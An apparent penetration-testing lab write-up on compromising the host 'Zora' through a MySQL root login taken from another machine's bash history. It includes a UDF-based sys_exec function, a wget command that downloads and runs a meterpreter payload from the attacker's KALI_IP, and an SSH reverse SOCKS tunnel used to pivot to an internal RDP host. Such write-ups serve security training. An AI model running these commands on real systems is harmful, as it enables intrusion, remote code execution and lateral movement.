# Zora (10.5.5.11)
***
## Exploitation

1. MySQL root and password was retrieved from `/root/.bash_history` file of Ajla (`10.4.4.10`). We used the credentials to connect to the mysql server.
   
``` 
mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb --host=127.0.0.1 --port=13306
```

> [!info] 
> One of the techniques to execute OS commands using MySQL is through the use of **[User Defined Functions (UDF)](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf#user-defined-functions-to-rce)**. 
> 
> Using our console access (with root privilege), we are able to write a library (`.so`) containing a User Defined Functions (e.g function that execute OS commands) that can be then invoked through additional queries.

2. We've created a function named `sys_exec` (that will execute OS commands), through the use of the following queries. 
```
MariaDB [(none)]> set @shell = 0x<HEX_OF_SO>; select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec';
```

3. We downloaded and executed the meterpreter shell into the database server using the command:
```
MariaDB [(none)]> select sys_exec('wget http://KALI_IP/xshell.elf && chmod +x xshell.elf && ./xshell.elf');
```

4. We got our meterpreter shell afterwards.
   ![[zora-meterpreter.png]]
   
***
## Post-exploitation

> [!info] 
> Using our reverse shell, we checked on mounted-share using `cat /etc/fstab`, and we found out that a share is mounted from the `10.5.5.20` host.  The host `10.5.5.20` is only accessible internally, so we have to set up another port forward for us to be able to access it directly from our Kali machine.
> 
> Also, a powershell script named `system_report.ps1` was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`. 
   
1. Using our meterpreter shell, we generated a keypair (`ssh-keygen`) and added zora's  public key to our Kali machine.
``` 
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3Nza....Uzqt4+ns= mysql@zora
```

2. We set up a dynamic port forward (SOCKS) from Zora to Kali using port **1080**
   
```
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@KALI_IP
```

```
sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
```

3. From our Kali, we scanned `10.5.5.20` for open ports using the command `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` 
We discovered an open port **3389** running **Remote Desktop Protocol (RDP)**.

